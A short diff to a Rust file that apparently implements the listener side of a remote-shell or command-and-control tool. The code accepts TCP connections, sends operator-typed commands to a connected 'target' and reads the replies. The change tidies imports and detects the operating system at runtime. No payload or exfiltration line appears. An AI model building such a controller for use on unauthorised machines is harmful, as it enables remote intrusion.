@@ -1,9 +1,12 @@
-use std::net::{TcpListener, TcpStream};
-use std::io::{self, stdin, Read, Write};
-use std::str;
+use std::{
+    net::{TcpListener, TcpStream},
+    io::{self, stdin, Read, Write},
+    str,
+    env,
+};
 
 use crate::library::Target;
-use crate::library::parse_command_and_write;
+use crate::library::parse_command;
 
 pub fn socket_listen(addr: &String, port: &String) {
 
@@ -20,7 +23,7 @@ pub fn socket_listen(addr: &String, port: &String) {
 
         let target = Target {
             stream: stream,
-            os: String::from("mac"),
+            os: String::from(env::consts::OS),
         };
 
         // target_vec.push(&target);
@@ -39,9 +42,8 @@ fn handle_client(mut stream: TcpStream) {
         io::stdout().flush().unwrap();
         let mut write_buf = String::new();
         stdin().read_line(&mut write_buf).unwrap();
-        parse_command_and_write(write_buf, &mut stream);
-        
-        // stream.write(write_buf.as_bytes()).unwrap();
+        let command = parse_command(write_buf);
+        stream.write(command.as_bytes()).unwrap();
 
         // read
         let mut read_buf = [0u8; 1024];
